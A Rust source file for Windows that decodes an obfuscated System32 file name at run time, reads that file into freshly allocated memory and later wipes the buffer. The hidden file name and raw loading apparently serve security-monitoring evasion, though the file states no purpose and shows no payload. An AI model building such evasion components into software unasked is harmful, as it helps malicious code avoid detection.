use std::env;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr::{null, null_mut};

use winapi::shared::minwindef::DWORD;
use winapi::um::errhandlingapi::GetLastError;
use winapi::um::fileapi::{CreateFileW, GetFileSize, ReadFile, OPEN_EXISTING, INVALID_FILE_SIZE};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::memoryapi::{VirtualAlloc, VirtualFree};
use winapi::um::winnt::{
    FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, GENERIC_READ,
    MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, MEM_RELEASE,
};

use crate::internal::crypto::coder::{decode, ENC};
use crate::internal::err::fatal_err;

#[inline(always)]
fn build_sys32_path(encoded: &[u16]) -> Vec<u16> {
    let base = env::var_os("SystemRoot")
        .or_else(|| env::var_os("windir"))
        .unwrap_or_else(|| OsStr::new("C:\\Windows").to_os_string());

    let base_str = base.to_string_lossy();

    let mut full = base_str.encode_utf16().collect::<Vec<u16>>();
    full.push(b'\\' as u16);
    full.extend("System32\\".encode_utf16());

    let len = encoded.iter().position(|&c| c == 0).unwrap_or(encoded.len());
    full.extend_from_slice(&encoded[..len]);
    full.push(0);
    full
}

pub unsafe fn buffer(out_size: &mut usize) -> *mut winapi::ctypes::c_void {
    let decoded = decode(&ENC);
    let path_w = build_sys32_path(&decoded);

    let file = CreateFileW(
        path_w.as_ptr(),
        GENERIC_READ,
        FILE_SHARE_READ,
        null_mut(),
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        null_mut(),
    );

    if file == INVALID_HANDLE_VALUE {
        let _code = GetLastError();
        fatal_err("CreateFileW failed");
    }

    let file_size = GetFileSize(file, null_mut());
    if file_size == INVALID_FILE_SIZE || file_size == 0 {
        CloseHandle(file);
        fatal_err("Invalid or empty file size");
    }

    let buffer = VirtualAlloc(
        null_mut(),
        file_size as usize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    ) as *mut winapi::ctypes::c_void;

    if buffer.is_null() {
        CloseHandle(file);
        fatal_err("VirtualAlloc failed");
    }

    let mut bytes_read: DWORD = 0;
    let read_ok = ReadFile(file, buffer, file_size, &mut bytes_read, null_mut()) != 0;
    CloseHandle(file);

    if !read_ok || bytes_read != file_size {
        VirtualFree(buffer, 0, MEM_RELEASE);
        fatal_err("Failed to read file");
    }

    *out_size = file_size as usize;
    
    buffer
}

pub unsafe fn zero_and_free(buffer: *mut winapi::ctypes::c_void, size: usize) {

    if !buffer.is_null() {
        let mut ptr = buffer as *mut u64;
        let end = ptr.add(size / 8);
        while ptr < end {
            std::ptr::write_volatile(ptr, 0);
            ptr = ptr.add(1);
        }

        let rem = size % 8;
        if rem > 0 {
            let byte_ptr = end as *mut u8;
            for i in 0..rem {
                std::ptr::write_volatile(byte_ptr.add(i), 0);
            }
        }

        VirtualFree(buffer, 0, MEM_RELEASE);
    }
}